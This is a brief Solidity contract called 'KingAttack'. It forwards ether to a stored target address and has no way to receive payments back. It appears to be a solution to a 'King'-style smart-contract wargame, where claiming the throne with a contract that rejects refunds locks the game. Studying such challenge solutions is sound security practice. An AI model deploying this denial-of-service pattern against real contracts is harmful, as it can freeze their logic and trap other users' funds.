// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract KingAttack {
    address target;
    constructor(address _target) {
        target = _target;
    }

    function send() external payable {
        payable(target).transfer(msg.value);
    }
}